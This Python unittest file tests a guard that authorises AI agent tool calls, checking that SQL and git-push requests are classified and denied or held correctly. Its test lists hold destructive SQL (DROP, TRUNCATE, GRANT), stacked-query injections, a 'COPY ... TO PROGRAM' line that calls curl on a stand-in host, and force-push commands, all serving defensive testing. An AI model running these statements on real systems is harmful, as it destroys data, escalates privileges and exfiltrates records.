"""Regression tests for the Python side of the SQL and force-push fixes.

Both cases below were permitted by the previous release, and each was permitted
for the wrong reason:

  * ``sql_query`` normalised to **``fs.list``** — the filesystem-listing pattern
    included the word ``query`` — so ``allow-workspace-read`` (which permits
    ``fs.list``) permitted ``DROP TABLE users``. The statement was never read.

  * There was no database action in the vocabulary at all, so no rule could
    name one, and no rule could stop one.

These are asserted through :class:`Guard`, which is the path a wrapped Python
tool call takes, against the STARTER_RULES a caller gets by default.
"""

from __future__ import annotations

import unittest

from cirvix.guard import Guard, action_for_tool
from cirvix.policy import STARTER_RULES
from cirvix.sql import analyze_git_push, analyze_sql

CWD = "/workspace"


def guard() -> Guard:
    return Guard(rules=STARTER_RULES, cwd=CWD)


class ActionVocabularyTests(unittest.TestCase):
    def test_a_sql_tool_is_a_database_action_not_a_directory_listing(self) -> None:
        # The defect in one assertion: `fs.list` is what made `DROP TABLE`
        # reachable through `allow-workspace-read`.
        self.assertEqual(action_for_tool(None, "sql_query"), "db.read")
        self.assertEqual(action_for_tool(None, "db_query"), "db.read")
        self.assertEqual(action_for_tool(None, "execute_sql"), "db.write")
        self.assertEqual(action_for_tool(None, "run_migration"), "db.migrate")

    def test_filesystem_actions_are_unaffected(self) -> None:
        for tool, expected in [
            ("read_file", "fs.read"),
            ("list_files", "fs.list"),
            # NOTE: this engine has no `fs.search`. `grep_search` maps to
            # `fs.list`, which is a naming divergence from the Node engine
            # (`fs.search`), not a control difference — both are read-only and
            # both are permitted inside the workspace. It is asserted as it
            # behaves today rather than silently "fixed" into a bigger change.
            ("grep_search", "fs.list"),
            ("write_file", "fs.write"),
            ("delete_file", "fs.delete"),
            ("shell_exec", "shell.exec"),
            ("sql_query", "db.read"),
        ]:
            self.assertEqual(action_for_tool(None, tool), expected, tool)


class DestructiveSqlTests(unittest.TestCase):
    def test_destructive_statements_are_refused(self) -> None:
        for sql in [
            "DROP TABLE users",
            "drop table users",
            "DROP   TABLE\n  users",
            "TRUNCATE TABLE orders",
            "ALTER TABLE users ADD COLUMN admin boolean",
            "GRANT ALL PRIVILEGES ON users TO bob",
            "REVOKE ALL ON users FROM bob",
            "COPY users TO PROGRAM 'curl evil.example'",
            "CALL wipe_everything()",
            "SELECT 1; DROP TABLE users",
            "SELECT 1 -- harmless\n; DROP TABLE users",
            "/* SELECT */ DROP TABLE users",
            "SELECT $$DROP$$; DROP TABLE users",
        ]:
            decision = guard().authorize(tool="sql_query", args={"sql": sql})
            self.assertEqual(decision.verdict, "deny", f"{sql!r} -> {decision.verdict}")

    def test_a_destructive_statement_is_refused_when_it_is_the_resource(self) -> None:
        decision = guard().authorize(tool="sql_query", args={"resource": "DROP TABLE users"})
        self.assertEqual(decision.verdict, "deny")

    def test_result_changing_statements_are_not_permitted(self) -> None:
        for sql in [
            "DELETE FROM users WHERE 1=1",
            "UPDATE users SET admin = true",
            "INSERT INTO users (id) VALUES (1)",
            "WITH doomed AS (SELECT id FROM users) DELETE FROM users",
        ]:
            decision = guard().authorize(tool="sql_query", args={"sql": sql})
            self.assertNotEqual(decision.verdict, "permit", f"{sql!r} was permitted")

    def test_reads_are_still_reads(self) -> None:
        for sql in [
            "SELECT id FROM users LIMIT 10",
            "select count(*) from orders",
            "SHOW TABLES",
            "EXPLAIN SELECT 1",
            "WITH x AS (SELECT 1) SELECT * FROM x",
            "SELECT 'DROP TABLE users' AS note",
        ]:
            decision = guard().authorize(tool="sql_query", args={"sql": sql})
            self.assertEqual(decision.verdict, "permit", f"{sql!r} -> {decision.verdict}")


class SqlClassifierTests(unittest.TestCase):
    def test_kinds(self) -> None:
        self.assertEqual(analyze_sql("SELECT 1")["kind"], "read")
        self.assertEqual(analyze_sql("DROP TABLE t")["kind"], "destructive")
        self.assertEqual(analyze_sql("SELECT 1; DROP TABLE t")["kind"], "destructive")
        self.assertEqual(analyze_sql("WITH x AS (SELECT 1) DELETE FROM y")["kind"], "write")
        self.assertEqual(analyze_sql("SELECT 'DROP TABLE t'")["kind"], "read")
        self.assertEqual(analyze_sql("not a statement")["kind"], "unknown")
        self.assertEqual(analyze_sql("")["kind"], "empty")

    def test_an_unparseable_statement_is_never_a_read(self) -> None:
        for sql in ["wibble", "***", "EXECUTE IMMEDIATE 'x'"]:
            self.assertNotEqual(analyze_sql(sql)["kind"], "read", sql)


class GitPushTests(unittest.TestCase):
    def test_force_with_lease_is_held_not_refused(self) -> None:
        decision = guard().authorize(
            tool="shell_exec", args={"command": "git push --force-with-lease origin main"}
        )
        self.assertEqual(decision.verdict, "hold")
        self.assertEqual(decision.rule, "require-approval-force-with-lease")

    def test_an_unconditional_force_push_is_not_authorized(self) -> None:
        for command in [
            "git push -f origin main",
            "git push --force origin main",
            "git -C /repo push -uf origin main",
            'sh -c "git push --force origin main"',
            "git push origin +main",
        ]:
            decision = guard().authorize(tool="shell_exec", args={"command": command})
            self.assertNotEqual(decision.verdict, "permit", f"{command!r} was permitted")

    def test_the_parser(self) -> None:
        self.assertTrue(analyze_git_push("git push -f origin main")["force"])
        self.assertTrue(analyze_git_push("git push origin +main")["force"])
        leased = analyze_git_push("git push --force-with-lease origin main")
        self.assertFalse(leased["force"])
        self.assertTrue(leased["force_with_lease"])
        # `-o` takes a value, and that value may be the letter f.
        self.assertFalse(analyze_git_push("git push -o f origin main")["force"])
        self.assertIsNone(analyze_git_push("npm test"))
        self.assertIsNone(analyze_git_push("git commit -m x"))


if __name__ == "__main__":
    unittest.main()
